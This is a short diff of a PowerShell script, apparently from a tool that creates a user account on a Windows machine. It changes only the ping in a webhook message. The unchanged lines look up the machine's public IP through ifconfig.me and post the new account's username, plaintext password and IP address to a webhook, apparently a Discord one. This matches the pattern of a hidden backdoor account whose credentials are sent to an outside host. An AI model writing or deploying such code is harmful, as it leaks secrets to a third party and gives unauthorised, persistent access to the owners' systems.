@@ -10,7 +10,7 @@ $ipAddress = (Invoke-WebRequest -Uri "http://ifconfig.me/ip").Content.Trim()
 
 $jsonPayload = @{
     username = "Server Notification"
-    content = "New user created:`nUsername: $username`nPassword: $password`nIP Address: $ipAddress `nPing: @Windows"
+    content = "New user created:`nUsername: $username`nPassword: $password`nIP Address: $ipAddress `nPing: <@1269087350089318453>"
 } | ConvertTo-Json
 
 Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload
